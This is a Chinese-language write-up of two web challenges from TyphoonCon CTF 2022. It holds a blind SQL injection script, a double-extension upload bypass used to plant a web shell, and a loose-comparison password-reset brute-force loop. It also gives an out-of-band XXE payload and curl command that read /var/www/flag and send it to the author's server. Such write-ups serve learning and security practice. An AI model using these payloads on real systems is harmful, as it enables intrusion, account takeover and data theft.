# [TyphoonCon CTF 2022] WP




# KnowMe

首先是扫了个目录，发现了robots.txt

```
/items.php
/var/www/flag
```

这里的items.php是一个查询接口

![image-20220626144933473](https://tuchuang.huamang.xyz/img/image-20220626144933473.png)

经测试是order by的盲注，这里我写了个脚本，这里只展示到最后查询密码

```python
import requests
import string

strings = "abcdef1234567890"
url = "https://typhooncon-knowme.chals.io/items.php?sort=rand(substr((select/**/group_concat(password)/**/from/**/users),{},1)='{}')"
flag = ''

for i in range(80):
    for s in strings:
        fuckurl = url.format(i,s)
        res = requests.get(url=fuckurl).text
        if '"id":2' in res:
            flag+=s
            print(flag)
        else :
            print("-",end="")
```

注出来，admin密码md5：d41d8cd98f00b204e9800998ecf8427e

解出来是空

<img src="https://tuchuang.huamang.xyz/img/image-20220626145323034.png" alt="image-20220626145323034" style="zoom:150%;" />

只需要bp进行前端限制的绕过即可，然后就会跳转到profile.php

![image-20220626145457790](https://tuchuang.huamang.xyz/img/image-20220626145457790.png)

进行文件上传，这里只允许上传图片，且是白名单，这里直接上传1.png.php即可绕过，估计这里的逻辑判断只取了第一个点后面的后缀

直接传shell后拿flag

![image-20220626145905890](https://tuchuang.huamang.xyz/img/image-20220626145905890.png)

进去拿到了源码后，的确是这样的逻辑

![image-20220626145933403](https://tuchuang.huamang.xyz/img/image-20220626145933403.png)

# Typo

## step1

给了赛题文件，这里是有一个登录的操作的，但是很多的路由都需要登录，只有change.php和forgot.php不需要登录

在change.php里面，这里会通过uid查询一个token，而这里的token进行了一个substr，只取了前4位

所以这样我们是可以尝试爆破的

```php
$uid = mysqli_real_escape_string($mysqli, $_POST['uid']);
$pwd = md5(mysqli_real_escape_string($mysqli, $_POST['psw']));
$sig = mysqli_real_escape_string($mysqli, $_POST['token']);

$sqlGetTokens = "SELECT token from tokens where uid='$uid'";

$result = $mysqli->query($sqlGetTokens);
$data = mysqli_fetch_array($result);
$sigDB = substr($data[0], 0, 4);

if( $sig == $sigDB ){

	$sqlChange = "UPDATE users SET password='$pwd' where id='$uid'";
	$mysqli->query($sqlChange);
	
	$sqlDelete = "DELETE FROM tokens WHERE uid='$uid'";
	$mysqli->query($sqlDelete);
```

但是直接爆破难度有点大，这里就可以利用forget.php的功能

```php
if($_SERVER['REQUEST_METHOD'] == "POST"){
	$uname = mysqli_real_escape_string($mysqli, $_POST['uname']);
	$s = system("date +%s%3N > /tmp/time");
	$time = file_get_contents("/tmp/time");
	$fullToken = md5( $unam . $time . "SECRET" );

	$sqlGetId = "SELECT id FROM users where username='$uname'";
	$result = $mysqli->query($sqlGetId);
	$data = mysqli_fetch_array($result);
	$uid = $data[0];

	$sqlDelete = "DELETE FROM tokens WHERE uid='$uid'";
	$mysqli->query($sqlDelete);

	$sqlInsert = "INSERT INTO tokens values('$uid','$fullToken')";
	$mysqli->query($sqlInsert);

	die("<script>alert('Token sent to you.');window.location.href='/index.php';</script>");

}
```

这里会基于uname，time，”SECRET“生成一个md5，然后我发现这里真是写错了个单词$unam。。。

所以这里fullToken就会是md5(time+"SECRET")了，如果爆破点放在token上，那么我们确实是有可能爆破出来的，但是比赛的时候很多人都会做这个题目，所以time会经常变化，这让我们爆破的难度有点大

而对于这个time是可以变化的，每次POST访问forget的时候，这里就会刷新time，所以说之类我们可以利用**php不严格的判断**，让time进行变化，当变成0exxxxx的时候，这时候我们把sig赋值为0000就能让条件`$sig == $sigDB`满足

![image-20220626211651487](https://tuchuang.huamang.xyz/img/image-20220626211651487.png)

写个脚本来进行爆破

```python
import requests

target = "https://typhooncon-typo.chals.io"
passwd = "hack"

data1 = {
    "uname": "admin"
}

data2 = {
    "uid": "1",
    "psw": passwd,
    "token": "0000"
}
while True:
    try:
        res = requests.post(f"{target}/forgot.php", data1)
        print(res.text)
        res = requests.post(f"{target}/change.php", data2)
        print(res.text)
        if "Password Changed." in res.text:
            print(passwd)
            break
    except:
        pass
```

爆破的结果，成功更改密码

![image-20220626210234742](https://tuchuang.huamang.xyz/img/image-20220626210234742.png)



![image-20220626210204547](https://tuchuang.huamang.xyz/img/image-20220626210204547.png)

拿到cookie：`PHPSESSID=ql32dudasjts4rjbsctj0vrvqd`

## step2

这里到了profile.php，存在一个xml的使用，猜测这里是存在一个xxe的

```js
	<script type="text/javascript">
		xhr = new XMLHttpRequest()
		xhr.onreadystatechange = function(){
			document.getElementById("email").innerHTML = "E-Mail: "+this.responseText
		}
		xhr.open("get","data.php?u=<?php echo $uname;?>")
		xhr.send()

		function read(){
			var xml = '<\?xml version="1.0" encoding="UTF-8"?><user><username>'+document.getElementById("user").value+'</username></user>'

			var xhr = new XMLHttpRequest()
			xhr.onreadystatechange = function(){
				var out = document.getElementById("output")
				out.value = this.responseText
			}
			xhr.open("post","read.php")
			// 
			xhr.setRequestHeader("UUID", document.getElementById("uuid").value)
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
			xhr.send("data="+encodeURIComponent(xml))
		}
	</script>
```

但是这里需要有一个UUID，我们再更进看一下read.php

```php
$uuid = $_SERVER['HTTP_UUID'];

if( $uuid != "XXXX" ){
	die("UUID is not valid");
}
include 'database.php';
$xml = urldecode($_POST['data']);

$dom = new DOMDocument();
try{
	@$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
}catch (Exception $e){
	echo '';
}
$userInfo = @simplexml_import_dom($dom);
$output = "User Sucessfully Added.";

$user = mysqli_real_escape_string($mysqli, @$userInfo->username);

$sql = "select * from users where username='$user'";
```

这里会对uuid进行一个判断，才会进一步的加载xml，所以我们的获取到这个uuid，这里我们还有个文件没看，那就是data.php，可以看到这里的sql查询是没有增加过滤的，所以我们在这里进行一个sql注入

```php
$uname = $_GET['u'];
$sql = "SELECT email FROM users where username='$uname'";

if( $result = $mysqli->query($sql) ){
	$data = @mysqli_fetch_array($result);
	$email = $data[0];
	echo $email;
}else{
	echo "Erorr";
}
```

这里直接用sqlmap一把嗦

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] typodb


Database: typodb
[3 tables]
+------------+
| secretkeys |
| tokens     |
| users      |
+------------+



Database: typodb
Table: secretkeys
[1 entry]
+--------------------------------------+
| uuidkey                              |
+--------------------------------------+
| 8d6ed261-f84f-4eda-b2d2-16332bd8c390 |
+--------------------------------------+
```

拿到uuid，这样我们就可以构造xxe进行攻击了，但是有个问题，这里没有回显，所以我们得在自己vps搭建个，我的payload参考[此处](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter)

vps放一个dtd.xml

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ip:port/dtd.xml?%data;'>">
```

起一个python服务

```
python3 -m http.server 11111
```

curl发包

```
curl -X POST https://typhooncon-typo.chals.io/read.php -H "UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390" -H "Cookie: PHPSESSID=ql32dudasjts4rjbsctj0vrvqd" -d "data=%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%20%22http%3A%2F%2F[ip]%2Fdtd%2Exml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E"
```

![image-20220626225143702](https://tuchuang.huamang.xyz/img/image-20220626225143702.png)

成功带出flag

![image-20220626225130183](https://tuchuang.huamang.xyz/img/image-20220626225130183.png)

![image-20220626225226359](https://tuchuang.huamang.xyz/img/image-20220626225226359.png)

